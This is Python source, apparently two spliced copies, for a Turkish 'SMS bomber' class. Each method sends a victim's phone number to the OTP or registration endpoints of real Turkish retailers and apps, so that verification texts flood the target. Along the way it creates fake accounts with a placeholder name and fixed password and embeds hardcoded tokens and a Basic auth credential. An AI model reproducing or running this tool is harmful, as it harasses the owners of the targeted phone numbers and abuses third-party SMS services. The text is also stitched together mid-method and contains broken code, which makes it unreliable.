            data = f"--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--mZ1efqJfdLsZpDtAko-rYcDUe1emE8hTNxCWVmbgNDAVpR17T28SZiQpsvCU2b3sNbio7u--\r\n"
            r = requests.post(url, headers=headers, data=data)
            if (r.status_code) == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> madamecoco.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> madamecoco.com")
            
            
    #balikesiruludag.com.tr
    def Buludag(self):
        try:
            r = requests.get(f"https://bilet.balikesiruludag.com.tr:443/mobil/UyeOlKontrol.php?CepTelefon={self.phone}")
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> bilet.balikesiruludag.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> bilet.balikesiruludag.com.tr")   
            
    
    #evidea.com
    def Evidea(self):
        try:
            url = "https://www.evidea.com:443/users/register/"
            headers = {"Content-Type": "multipart/form-data; boundary=fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi", "X-Project-Name": "undefined", "Accept": "application/json, text/plain, */*", "X-App-Type": "akinon-mobile", "X-Requested-With": "XMLHttpRequest", "Accept-Language": "tr-TR,tr;q=0.9", "Cache-Control": "no-store", "Accept-Encoding": "gzip, deflate", "X-App-Device": "ios", "Referer": "https://www.evidea.com/", "User-Agent": "Evidea/1 CFNetwork/1335.0.3 Darwin/21.6.0", "X-Csrftoken": "7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps"}
            data = f"--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"first_name\"\r\n\r\nMemati\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"last_name\"\r\n\r\nBas\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email\"\r\n\r\n{self.mail}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"email_allowed\"\r\n\r\nfalse\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"sms_allowed\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"password\"\r\n\r\n31ABC..abc31\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"phone\"\r\n\r\n0{self.phone}\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi\r\ncontent-disposition: form-data; name=\"confirm\"\r\n\r\ntrue\r\n--fDlwSzkZU9DW5MctIxOi4EIsYB9LKMR1zyb5dOuiJpjpQoK1VPjSyqdxHfqPdm3iHaKczi--\r\n"
            r = requests.post(url, headers=headers, data=data)      
            if r.status_code == 202:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> evidea.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> evidea.com")
            
    
    #koctas.com.tr
    def Koctas(self):
        try:
            url = "https://occ2.koctas.com.tr:443/koctaswebservices/v2/koctas/registerParo/get-register-parocard-otp"
            data = {"givePermission": "true", "mobileNumber": self.phone}
            r = requests.post(url, data=data)
            if (r.json()["status"]) == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> occ2.koctas.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> occ2.koctas.com.tr")
            
            
    #gratis.com
    def Gratis(self):
        try:
            token = requests.get("https://ivt.mobildev.com:443/auth", headers={"Accept": "*/*", "Accept-Encoding": "gzip, deflate", "User-Agent": "Gratis/2.2.5 (com.pharos.Gratis; build:1447; iOS 15.6.1) Alamofire/5.6.2", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Authorization": "Basic NDkxNTkwNjU2OTpnMDg1M2YzY3Z0cjJkYXowYTFodXE3bnNveGZ6cTA=", "Connection": "close"}).json()["access_token"]
            url = "https://ivt.mobildev.com:443/data/0e80tyg8"
            headers = {"Accept": "*/*", "Content-Type": "application/json", "Authorization": f"Bearer {token}", "Accept-Encoding": "gzip, deflate", "User-Agent": "Gratis/2.2.5 (com.pharos.Gratis; build:1447; iOS 15.6.1) Alamofire/5.6.2", "Accept-Language": "tr-TR;q=1.0, en-TR;q=0.9", "Connection": "close"}
            json={"accountType": 0, "coordinate": {"lat": 0, "lon": 0}, "customId": "", "email": self.mail, "etk": {"call": 2, "email": 2, "emailFrequency": 2, "emailFrequencyType": 1, "msisdn": 1, "msisdnFrequency": 2, "msisdnFrequencyType": 1, "share": 1}, "extended": {"loyalty": 11}, "firstName": "Memati", "kvkk": {"international": 1, "process": 1, "share": 1}, "language": "tr", "lastName": "Bas", "msisdn": self.phone, "note": "\xc4\xb0zin S\xc3\xbcreci Ba\xc5\x9flatma", "permSource": 3}
            r = requests.post(url, headers=headers, json=json)
            if (r.status_code) == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> ivt.mobildev.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> ivt.mobildev.com")
    
    
    #anadolu.com.tr
    def Anadolu(self):
        try:
            url = f"https://www.anadolu.com.tr:443/mobil/OneriSms2.php?Numara={self.phone}&NAME=Memati%20Bas"
            r = requests.get(url)
            if r.status_code == 200:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> anadolu.com.tr")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> anadolu.com.tr")
            
            
    #accordors.com
    def Accordors(self):
        try:
            url = "http://aouws.accordors.com:80/api"
            json={"apiVersion": "0.1.0", "id": "", "method": "members.new", "params": {"email": self.mail, "firstname": "Memati", "gender": "male", "identityno": "00000000001", "lastname": "Bas", "password": "31ABC..abc31", "phone": self.phone}}
            r = requests.post(url, json=json)
            if r.json()["data"]:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> aouws.accordors.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> aouws.accordors.com")
            
        
    #marti.tech
    def Marti(self):
        try:
            url = "https://customer.martiscooter.com:443/v13/scooter/dispatch/customer/signin"
            json={"mobilePhone": self.phone, "mobilePhoneCountryCode": "90", "oneSignalId": ""}
            r = requests.post(url,  json=json)
            if r.json()["isSuccess"] == True:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> customer.martiscooter.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> customer.martiscooter.com")
            
    
    #hoplagit.com
    def Hop(self):
        try:
            url = "https://api.hoplagit.com:443/v1/auth:reqSMS"
            json={"phone": f"+90{self.phone}"}
            r = requests.post(url,  json=json)
            if r.status_code == 201:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.hoplagit.com")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.hoplagit.com")
            
    
    #gokarma.app
    def Karma(self):
        try:
            url = "https://api.gokarma.app:443/v1/auth/send-sms"
            json={"deviceId": "31", "language": "tr-TR", "phoneNumber": f"90{self.phone}", "type": "REGISTER"}
            r = requests.post(url,  json=json)
            if r.status_code == 201:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.gokarma.app")
                self.adet += 1
            else:
                raise
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.gokarma.app")
    
    def twitch(self):
        try:
            requests.post('https://passport.twitch.tv/register?trusted_request=true',json={'birthday': {'day': 11, 'month': 11, 'year': 1999},'client_id': 'kd1unb4b3q4t58fwlpcbzcbnm76a8fp', 'include_verification_code': True,'password': password, 'phone_number': {self.phone},'username': username})
            print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı! {self.phone} --> api.twtitch.com")
        except:
            print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! {self.phone} --> api.twitch.app")
    
    
    import requests
from random import choice
from string import ascii_lowercase
from bs4 import BeautifulSoup
from colorama import Fore, Style
from time import sleep
from user_agent import generate_user_agent
import urllib.request

class SendSms():
    adet = 0
    toplam_sms = 1
    
   
    def __init__(self, phone, phone2, phone3, phone4, phone5, mail):
        self.phone = str(phone)
        self.phone2 = str(phone2)
        self.phone3 = str(phone3)
        self.phone4 = str(phone4)
        self.phone5 = str(phone5)
        if len(mail) != 0:
            self.mail = mail
        else:
            self.mail = ''.join(choice(ascii_lowercase) for i in range(19))+"@gmail.com"
            
    
    


    # dsmartgo.com.tr
    def Dsmartgo(self):
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                    dsmartgo = requests.post("https://www.dsmartgo.com.tr/web/account/checkphonenumber", data={
        	        "__RequestVerificationToken": "bYFLKS9DehCBAb7l7KaI2WoTdtAJZya-AWsDTmHCl9FnEaUZiF2F1l3XkwppUyT0I3bXMUdUAruBUcqR8jVuLVsxPC41",
        	        "IsSubscriber": "true",
        	        "__reCAPTCHAVerificationToken": "03AGdBq26zV1jYt3RM1kdow0gpFcD7veljQAdV-0QoKLQIWi3voe27TlOwjbktguXtHgngHy13jsTzudfoNuLowIdqG1RcX4_XP5VoXy4un214kmTqChIDJPMKWvkUmLfXvWvXNTdajueI0T4zkdX2VGLz1Vn-uQxRRWxXjY81GZQlLUqu3oOSDYLBN2JH5DPh79Ms4BAxrTFC-ywWIWN1VVN5R2S6R6Ew7iyhDN_QQ1Ow5XcKuT7ycZbMrC_GUML5sKeDgoOtvm4pZ75LKX8ZArd9EPM783h0AXXVMedFGxa0V7a6_FocQ_7PRHeyOnku-HyoMgGZgB7cSIu6tPNddtYGLbOMGhR-2EyCtW4qKq1a9yceT-v7nequ9S0Cr-gYhb7DkjUyk56oUaZD6Za2NzqxIHPzfWC2M9x8WWeiWFqGSCHhjtL29UzGV8HH38X85BEpJKUVc_1U",
        	        "Mobile": numara,
                }, cookies={
        		    "__RequestVerificationToken": "zavKdfCRqVPRUTX-52rcfG8yfGNVfs10gNOb5RIn16upRTctGH4nBp8ReSMxzZUN4cJQTcvY0b4uzP6AL0inDD_cFyA1",
        		    "_ga": "GA1.3.1016548678.1638216163",
        		    "_gat": "1",
        		    "_gat_gtag_UA_18913632_14": "1",
        		    "_gid": "GA1.3.1214889554.1638216163",
        		    "ai_session": "lsdsMzMdX841eBwaKMxd8e|1638216163472|1638216163472",
        		    "ai_user": "U+ClfGV5d2ZK1W1o19UNDn|2021-11-29T20:02:43.148Z"
        	    })
            try:
                BeautifulSoup(dsmartgo.text, "html.parser").find("div", {"class": "info-text"}).text.strip()
                print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> dsmartgo.com.tr")
            except AttributeError:
                print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> dsmartgo.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                self.adet += 1
                self.toplam_sms += 1
            uygulanan_nolar += 1
            if uygulanan_nolar == bos_olmayan:
                break
            else:
                continue
        

    # kigili.com
    def Kigili(self): 
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    kigili = requests.post("https://www.kigili.com/users/registration/", data={
                    "first_name": "Memati",
                    "last_name": "Bas",
                    "email": self.mail,
                    "phone": f"0{numara}",
                    "password": "31ABC..abc31",
                    "confirm": "true",
                    "kvkk": "true",
                    "next": ""
                })
                    if kigili.status_code == 202:
                         print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> kigili.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                         self.adet += 1
                         self.toplam_sms += 1
                    else:
                        raise 
                except :
                     print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> kigili.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
                else:
                    continue
        

    #kahvedunyasi.com
    def KahveDunyasi(self):    
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    kahve_dunyasi = requests.post("https://core.kahvedunyasi.com/api/users/sms/send", data={
                    "mobile_number": numara,
                    "token_type": "register_token"
                })
                    if len(kahve_dunyasi.json()["meta"]["messages"]["error"]) == 0:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> core.kahvedunyasi.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise 
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> core.kahvedunyasi.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
        

    #naosstars.com
    def NaosStars(self):
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    naosstars = requests.post("https://shop.naosstars.com/users/register/", data={
                    "email": self.mail,
                    "first_name": "Memati",
                    "last_name": "Bas",
                    "password": "31ABC..abc31",
                    "date_of_birth": "1975-12-31",
                    "phone": f"0{numara}",
                    "gender": "male",
                    "kvkk": "true",
                    "contact": "true",
                    "confirm": "true"
                })
                    if naosstars.status_code == 202:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> shop.naosstars.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                       raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> shop.naosstars.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
                else:
                    continue
          
        
    #wmf.com.tr
    def Wmf(self):        
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    wmf = requests.post("https://www.wmf.com.tr/users/register/", data={
                    "confirm": "true",
                    "date_of_birth": "1956-03-01",
                    "email": self.mail,
                    "email_allowed": "true",
                    "first_name": "Memati",
                    "gender": "male",
                    "last_name": "Bas",
                    "password": "31ABC..abc31",
                    "phone": f"0{numara}"
                })
                    if wmf.status_code == 202:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> wmf.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                       raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> wmf.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
                else:
                    continue
         
    
    #istegelsin.com
    def IsteGelsin(self):
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    json={"operationName": "SendOtp2", "query": "mutation SendOtp2($phoneNumber: String!) {\n  sendOtp2(phoneNumber: $phoneNumber) {\n    __typename\n    alreadySent\n    remainingTime\n  }\n}", "variables": {"phoneNumber": "90"+str(numara)}}
                    r = requests.post("https://prod.fasapi.net:443/",  json=json)
                    if (r.json()["data"]["sendOtp2"]["alreadySent"]) == False:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> prod.fasapi.net "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> prod.fasapi.net "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
    
    
    #bim
    def Bim(self):         
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    bim = requests.post("https://bim.veesk.net:443/service/v1.0/account/login",  json={"phone": numara})
                    if bim.status_code == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> bim.veesk.net "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> bim.veesk.net "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
        
    #ceptesok.com
    def Sok(self):

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    r = requests.post("https://api.ceptesok.com:443/api/users/sendsms",  json={"mobile_number": numara, "token_type": "register_token"})
                    if len(r.json()["meta"]["messages"]["success"]) != 0:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> api.ceptesok.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> api.ceptesok.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #tiklagelsin.com
    def Tiklagelsin(self):
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    json={"operationName": "GENERATE_OTP", 
                             "query": "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(phone: $phone, challenge: $challenge, deviceUniqueId: $deviceUniqueId)\n}\n", 
                             "variables": {"challenge": "f2523023-283e-46be-b8db-c08f27d3e21c", 
                                         "deviceUniqueId": "3D7C1B44-7F5D-44FC-B3F2-A1024B3AF6D3", 
                                         "phone": numara
                                        }
                            }
                    tiklagelsin = requests.post("https://svc.apps.tiklagelsin.com:443/user/graphql", json=json)
                    if tiklagelsin.json()["data"]["generateOtp"] == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> svc.apps.tiklagelsin.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> svc.apps.tiklagelsin.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    

            
    #a101.com.tr
    def A101(self):
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://www.a101.com.tr:443/users/otp-login/"
                    data = {"phone": f"0{numara}", "next": "/a101-kapida"}
                    r = requests.post(url,data=data)
                    if (r.status_code) == 200:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> a101.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> a101.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    #englishhome.com
    def Englishhome(self):
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    data = {"first_name": "Memati", "last_name": "Bas", "email": self.mail, "phone": f"0{numara}", "password": "31ABC..abc31", "email_allowed": "true", "sms_allowed": "true", "confirm": "true", "tom_pay_allowed": "true"}
                    home = requests.post("https://www.englishhome.com:443/enh_app/users/registration/", data=data)
                    if home.status_code == 202:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> englishhome.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> englishhome.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
            
    #sakasu.com.tr
    def Sakasu(self):
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    data = {"phone": numara}
                    su = requests.post("https://www.sakasu.com.tr:443/app/api_register/step1", data=data)
                    if su.json()["status"] == "ok":
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> sakasu.com.tr "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> sakasu.com.tr "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #rentiva.com
    def Rentiva(self): 
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://rentiva.com:443/api/Account/Login"
                    headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "ionic://localhost", "Accept-Encoding": "gzip, deflate", "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148", "Accept-Language": "tr-TR,tr;q=0.9"}
                    json={"appleId": None, "code": "", "email": "", "facebookId": None, "googleId": None, "lastName": "", "name": "", "phone": numara, "type": 1}
                    rentiva = requests.post(url, headers=headers, json=json)
                    if rentiva.json()["success"] == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> rentiva.com "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> rentiva.com "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
    
    #bineq.tech
    def Bineq(self):
        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = f"https://bineqapi.heymobility.tech:443/V2//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={numara}"
                    headers = {"Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Accept-Encoding": "gzip, deflate", "User-Agent": "HEY!%20Scooter/116 CFNetwork/1335.0.3 Darwin/21.6.0", "Accept-Language": "tr"}
                    bineq = requests.post(url, headers=headers)
                    if bineq.json()["IsSuccess"] == True:
                        print(f"{Fore.LIGHTGREEN_EX}[+] {Style.RESET_ALL}Başarılı!  --> bineqapi.heymobility.tech "+Fore.CYAN+numara+Style.RESET_ALL+" Toplam gönderilen SMS: "+Fore.LIGHTGREEN_EX+ str(self.toplam_sms))
                        self.adet += 1
                        self.toplam_sms += 1
                    else:
                        raise
                except:
                    print(f"{Fore.LIGHTRED_EX}[-] {Style.RESET_ALL}Başarısız! --> bineqapi.heymobility.tech "+numara)
                uygulanan_nolar += 1
                if uygulanan_nolar == bos_olmayan:
                    break
            else:
                continue
            
            
    #superpedestrian.com
    def Link(self):

        liste = [self.phone, self.phone2, self.phone3, self.phone4, self.phone5]
        bos_olmayan = len([x for x in liste if x != "bos"])
        uygulanan_nolar = 0
        for numara in liste:
            if numara != "bos":
                try:
                    url = "https://consumer-auth.linkfleet.de:443/consumer_auth/register"
                    json={"phone_number": f"+90{numara}"}
                    link = requests.post(url, json=json)
                    if link.json()["detail"] == "Ok":
